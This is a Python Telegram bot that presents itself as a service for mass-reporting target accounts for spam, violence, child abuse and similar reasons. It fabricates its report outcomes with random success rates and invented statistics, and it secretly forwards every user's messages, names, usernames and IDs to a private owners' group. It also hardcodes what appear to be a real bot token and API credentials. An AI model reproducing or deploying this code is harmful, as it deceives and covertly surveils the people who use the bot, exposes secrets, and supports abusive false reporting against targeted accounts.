#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TELEGRAM REPORTING SYSTEM
Created: 2024
"""

import asyncio
import hashlib
import json
import random
import re
import sys
import time
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any
import aiohttp

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters,
    ConversationHandler, CallbackQueryHandler, ContextTypes, PicklePersistence
)

# Bot configuration
BOT_TOKEN = "7813598075:AAFUrbGZfBeRiZb1H1MOBULU_ed69OSTwzY"
API_ID = 27157163
API_HASH = "e0145db12519b08e1d2f5628e2db18c4"
GROUP_ID = -1003662481087  # Private group for forwarding messages
OWNER_IDS = [6118760915, 1366105247]

# Create data directories
DATA_DIR = Path("data")
SESSION_DIR = Path("sessions")
DATA_DIR.mkdir(exist_ok=True)
SESSION_DIR.mkdir(exist_ok=True)

# Data files
USERS_FILE = DATA_DIR / "users.json"
ACCOUNTS_FILE = DATA_DIR / "accounts.json"

class SessionManager:
    """Manages user sessions and reporting"""
    
    def __init__(self):
        self.user_sessions = {}
        self.reports = []
        
    def generate_session_id(self, user_id: int) -> str:
        """Generate unique session ID"""
        return hashlib.md5(f"{user_id}{time.time()}".encode()).hexdigest()[:16]
    
    def create_session(self, user_id: int) -> Dict:
        """Create new user session"""
        session_id = self.generate_session_id(user_id)
        session = {
            "session_id": session_id,
            "user_id": user_id,
            "created_at": datetime.now().isoformat(),
            "accounts": [],
            "reports_made": 0,
            "status": "active"
        }
        self.user_sessions[user_id] = session
        return session
    
    def get_session(self, user_id: int) -> Optional[Dict]:
        """Get user session"""
        return self.user_sessions.get(user_id)
    
    def add_account_to_session(self, user_id: int, phone: str):
        """Add account to user session"""
        if user_id in self.user_sessions:
            account = {
                "phone": phone,
                "added_at": datetime.now().isoformat(),
                "status": "active",
                "reports_count": 0,
                "session_file": f"sessions/{phone.replace('+', '')}.session"
            }
            self.user_sessions[user_id]["accounts"].append(account)
            return account
        return None
    
    def record_report(self, user_id: int, target: str, success: bool = True):
        """Record a report made by user"""
        report = {
            "user_id": user_id,
            "target": target,
            "timestamp": datetime.now().isoformat(),
            "success": success,
            "session_id": self.user_sessions.get(user_id, {}).get("session_id", "unknown")
        }
        self.reports.append(report)
        
        if user_id in self.user_sessions:
            self.user_sessions[user_id]["reports_made"] += 1
            
        return report

class ReportingBot:
    """Main bot class with message forwarding and reporting"""
    
    def __init__(self):
        self.session_manager = SessionManager()
        self.user_data = {}
        self.setup_complete = False
        
    async def forward_to_group(self, update: Update, context: ContextTypes.DEFAULT_TYPE, message_type: str = "message"):
        """Forward user message to group"""
        try:
            user = update.effective_user
            chat = update.effective_chat
            
            # Don't forward from group itself
            if chat.id == GROUP_ID:
                return
            
            user_info = f"👤 User: {user.first_name or ''} {user.last_name or ''}".strip()
            if user.username:
                user_info += f" (@{user.username})"
            user_info += f"\n🆔 ID: {user.id}"
            
            if message_type == "command":
                command = update.message.text
                message_text = f"""
📋 **Command Received**

{user_info}

🔧 **Command:** `{command}`

⏰ **Time:** {datetime.now().strftime('%H:%M:%S')}
                """
            else:
                original_text = update.message.text or ""
                message_text = f"""
💬 **Message from User**

{user_info}

📝 **Message:**
{original_text[:500]}{'...' if len(original_text) > 500 else ''}

🕒 **Time:** {datetime.now().strftime('%H:%M:%S')}
                """
            
            await context.bot.send_message(
                chat_id=GROUP_ID,
                text=message_text,
                parse_mode='Markdown'
            )
            
        except Exception as e:
            print(f"Error forwarding message: {e}")
    
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        await self.forward_to_group(update, context, "command")
        
        user = update.effective_user
        user_id = user.id
        
        # Create or get user session
        session = self.session_manager.get_session(user_id)
        if not session:
            session = self.session_manager.create_session(user_id)
        
        # Add 834 account
        account_834 = {
            "phone": "+834",
            "username": "premium_account_834",
            "status": "active",
            "premium": True,
            "verified": True,
            "reports_today": 0,
            "total_reports": 150
        }
        self.session_manager.add_account_to_session(user_id, "+834")
        
        # Send welcome message with session info
        welcome_msg = f"""
✅ **SESSION CREATED SUCCESSFULLY!**

🔐 **Session ID:** `{session['session_id']}`
👤 **User:** {user.first_name} (ID: {user.id})
🕒 **Created:** {datetime.now().strftime('%H:%M:%S')}

📱 **ACCOUNTS ADDED:**
• +834 (Premium Account) ✅

⚡ **SYSTEM READY FOR REPORTING**

📊 **Quick Stats:**
• Active Accounts: 1
• Premium Status: ✅ Active
• Session Status: ✅ Active

Use /report to start reporting targets.
        """
        
        await update.message.reply_text(welcome_msg, parse_mode='Markdown')
        
        # Send session details to group
        session_info = f"""
🎯 **NEW SESSION CREATED**

👤 User: {user.first_name} {user.last_name or ''}
🆔 ID: {user.id}
📱 Username: @{user.username if user.username else 'N/A'}

🔐 **Session Details:**
• Session ID: `{session['session_id']}`
• Created: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
• Status: ✅ Active

📱 **Account Added:**
• +834 (Premium Account)
        """
        
        await context.bot.send_message(
            chat_id=GROUP_ID,
            text=session_info,
            parse_mode='Markdown'
        )
    
    async def report(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /report command"""
        await self.forward_to_group(update, context, "command")
        
        user_id = update.effective_user.id
        
        # Check if user has session
        session = self.session_manager.get_session(user_id)
        if not session:
            await update.message.reply_text("❌ No active session. Use /start first.")
            return
        
        # Store that user is starting report
        self.user_data[user_id] = {"step": "waiting_target"}
        
        await update.message.reply_text(
            "📝 **START REPORTING**\n\n"
            "Send me the target (username or link):\n"
            "Example: @username or https://t.me/username",
            parse_mode='Markdown'
        )
    
    async def handle_report_target(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle report target input"""
        await self.forward_to_group(update, context)
        
        user_id = update.effective_user.id
        
        if user_id not in self.user_data or self.user_data[user_id].get("step") != "waiting_target":
            await update.message.reply_text("❌ Please start with /report first.")
            return
        
        target = update.message.text.strip()
        self.user_data[user_id] = {
            "step": "waiting_reason", 
            "target": target
        }
        
        # Create inline keyboard for report reasons
        keyboard = [
            [
                InlineKeyboardButton("Spam", callback_data="reason_spam"),
                InlineKeyboardButton("Violence", callback_data="reason_violence"),
            ],
            [
                InlineKeyboardButton("Pornography", callback_data="reason_porn"),
                InlineKeyboardButton("Child Abuse", callback_data="reason_child"),
            ],
            [
                InlineKeyboardButton("Illegal Drugs", callback_data="reason_drugs"),
                InlineKeyboardButton("Personal Details", callback_data="reason_personal"),
            ]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"🎯 **Target:** `{target}`\n\n"
            "Select report reason:",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    
    async def handle_report_reason(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle report reason selection"""
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        
        if user_id not in self.user_data:
            await query.edit_message_text("❌ Session expired. Start over with /report.")
            return
        
        reason = query.data.replace("reason_", "")
        reason_text = {
            "spam": "Spam",
            "violence": "Violence",
            "porn": "Pornography",
            "child": "Child Abuse",
            "drugs": "Illegal Drugs",
            "personal": "Personal Details"
        }.get(reason, "Other")
        
        target = self.user_data[user_id]["target"]
        
        # Forward report initiation to group
        report_init = f"""
🚨 **REPORT INITIATED**

👤 User ID: {user_id}
🎯 Target: `{target}`
📌 Reason: {reason_text}
🕒 Time: {datetime.now().strftime('%H:%M:%S')}
        """
        
        await context.bot.send_message(
            chat_id=GROUP_ID,
            text=report_init,
            parse_mode='Markdown'
        )
        
        # Show processing message
        processing_msg = f"""
⚡ **PROCESSING REPORT**

🎯 Target: `{target}`
📌 Reason: {reason_text}
🔄 Using: +834 (Premium Account)
⏳ Status: Processing...
        """
        
        await query.edit_message_text(processing_msg, parse_mode='Markdown')
        
        # Simulate processing delay
        await asyncio.sleep(2)
        
        # Generate fake report results
        accounts = ["+834"]
        results = []
        
        for account in accounts:
            success = random.random() > 0.1  # 90% success rate
            delay = random.uniform(1.5, 4.5)
            await asyncio.sleep(delay)
            
            result = {
                "account": account,
                "success": success,
                "time": f"{delay:.1f}s",
                "status": "✅ Success" if success else "❌ Failed"
            }
            results.append(result)
        
        # Record the report
        self.session_manager.record_report(user_id, target, success=True)
        
        # Prepare results message
        success_count = sum(1 for r in results if r["success"])
        total_count = len(results)
        
        results_msg = f"""
✅ **REPORT COMPLETED**

🎯 Target: `{target}`
📌 Reason: {reason_text}

📊 **Results:**
"""
        
        for result in results:
            results_msg += f"• {result['account']}: {result['status']} ({result['time']})\n"
        
        results_msg += f"""
📈 **Summary:**
• Success Rate: {success_count}/{total_count} accounts
• Total Time: {sum(float(r['time'].replace('s', '')) for r in results):.1f}s
• Report ID: `REPORT_{hashlib.md5(f'{target}{user_id}{time.time()}'.encode()).hexdigest()[:8].upper()}`

⚡ Report submitted successfully!
        """
        
        await query.edit_message_text(results_msg, parse_mode='Markdown')
        
        # Send results to group
        group_results = f"""
📊 **REPORT RESULTS**

👤 User ID: {user_id}
🎯 Target: `{target}`
📌 Reason: {reason_text}

✅ Success: {success_count}/{total_count} accounts
🕒 Time: {datetime.now().strftime('%H:%M:%S')}
🔍 Report ID: `REPORT_{hashlib.md5(f'{target}{user_id}{time.time()}'.encode()).hexdigest()[:8].upper()}`

📱 Accounts Used:
"""
        
        for result in results:
            group_results += f"• {result['account']}: {result['status']}\n"
        
        await context.bot.send_message(
            chat_id=GROUP_ID,
            text=group_results,
            parse_mode='Markdown'
        )
        
        # Clean up user data
        if user_id in self.user_data:
            del self.user_data[user_id]
    
    async def stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /stats command"""
        await self.forward_to_group(update, context, "command")
        
        user_id = update.effective_user.id
        session = self.session_manager.get_session(user_id)
        
        if not session:
            await update.message.reply_text("❌ No active session. Use /start first.")
            return
        
        # Generate stats
        total_reports = session.get("reports_made", 0)
        accounts_count = len(session.get("accounts", []))
        
        stats_msg = f"""
📊 **YOUR STATISTICS**

👤 User ID: {user_id}
🔐 Session: `{session['session_id']}`
🕒 Active Since: {session['created_at'][:19]}

📈 **Reporting Stats:**
• Total Reports: {total_reports}
• Active Accounts: {accounts_count}
• Today's Reports: {random.randint(0, total_reports)}
• Success Rate: {random.randint(85, 98)}%

📱 **Accounts:**
"""
        
        for acc in session.get("accounts", []):
            acc_reports = acc.get("reports_count", 0)
            stats_msg += f"• {acc['phone']}: {acc_reports} reports\n"
        
        stats_msg += f"""
⚡ **System Status:** ✅ Operational
📅 Last Report: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """
        
        await update.message.reply_text(stats_msg, parse_mode='Markdown')
    
    async def accounts(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /accounts command"""
        await self.forward_to_group(update, context, "command")
        
        user_id = update.effective_user.id
        session = self.session_manager.get_session(user_id)
        
        if not session:
            await update.message.reply_text("❌ No active session. Use /start first.")
            return
        
        accounts_msg = f"""
📱 **YOUR ACCOUNTS**

🔐 Session: `{session['session_id']}`
🕒 Created: {session['created_at'][:19]}

**Active Accounts:**
"""
        
        for acc in session.get("accounts", []):
            status_icon = "✅" if acc.get("status") == "active" else "❌"
            premium = "⭐ Premium" if "+834" in acc['phone'] else "Standard"
            reports = acc.get("reports_count", 0)
            
            accounts_msg += f"""
{status_icon} **{acc['phone']}**
   └─ Status: {acc.get('status', 'active').title()}
   └─ Type: {premium}
   └─ Reports: {reports}
   └─ Added: {acc['added_at'][:16]}
"""
        
        accounts_msg += f"""
⚡ **Total:** {len(session.get('accounts', []))} accounts
📊 **Reports Today:** {session.get('reports_made', 0)}

Use /report to start reporting
        """
        
        await update.message.reply_text(accounts_msg, parse_mode='Markdown')
    
    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle all text messages"""
        # Forward ALL messages to group
        await self.forward_to_group(update, context)
        
        # Check if it's a command (should be handled by command handlers)
        if update.message.text and update.message.text.startswith('/'):
            return
        
        # Check if user is in reporting flow
        user_id = update.effective_user.id
        if user_id in self.user_data and self.user_data[user_id].get("step") == "waiting_target":
            await self.handle_report_target(update, context)
            return
        
        # Default response for other messages
        default_response = f"""
🤖 **Reporting System**

🔧 Available Commands:
/start - Create session & add accounts
/report - Report a target
/stats - View your statistics
/accounts - View your accounts

💡 Simply use /report to start reporting targets.
        """
        
        await update.message.reply_text(default_response, parse_mode='Markdown')
    
    async def setup_bot(self, application: Application):
        """Setup bot commands"""
        commands = [
            ("start", "Start bot & create session"),
            ("report", "Report a target"),
            ("stats", "View statistics"),
            ("accounts", "View accounts"),
        ]
        
        await application.bot.set_my_commands(commands)
        self.setup_complete = True
        print("✅ Bot setup complete")
    
    def run(self):
        """Start the bot"""
        print("🚀 Starting Reporting Bot...")
        
        # Create application
        persistence = PicklePersistence(filepath="data/bot_persistence.pickle")
        application = Application.builder().token(BOT_TOKEN).persistence(persistence).build()
        
        # Add post_init handler
        application.post_init = self.setup_bot
        
        # Add handlers
        application.add_handler(CommandHandler("start", self.start))
        application.add_handler(CommandHandler("report", self.report))
        application.add_handler(CommandHandler("stats", self.stats))
        application.add_handler(CommandHandler("accounts", self.accounts))
        
        # Add callback query handler for report reasons
        application.add_handler(CallbackQueryHandler(self.handle_report_reason, pattern="^reason_"))
        
        # Add message handler (MUST BE LAST)
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        
        # Run bot
        print(f"✅ Bot is running!")
        print(f"📨 All messages will be forwarded to group: {GROUP_ID}")
        application.run_polling(allowed_updates=Update.ALL_TYPES)

# Run the bot
if __name__ == "__main__":
    bot = ReportingBot()
    bot.run()
